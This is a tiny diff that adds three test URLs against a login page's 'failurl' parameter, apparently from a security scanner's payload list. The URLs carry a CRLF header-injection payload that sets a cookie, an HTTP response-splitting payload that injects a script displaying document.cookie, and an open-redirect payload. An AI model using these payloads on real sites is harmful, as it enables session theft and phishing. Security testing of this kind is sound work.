@@ -1,0 +1,3 @@
+http://www.example.com/login/?user=foo&amp;pass=bar&amp;failurl=%0D%0ASet-Cookie%3A%20Rec=Sec
+http://www.example.com/login/?user=foo&amp;pass=bar&amp;failurl=%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%3Ealert%28%22Recognize-Security%20-%20%22%2Bdocument.cookie%29;%3C/script%3E%3C!--
+http://www.example.com/login/?user=foo&amp;pass=bar&amp;failurl=http://www.rec-sec.com
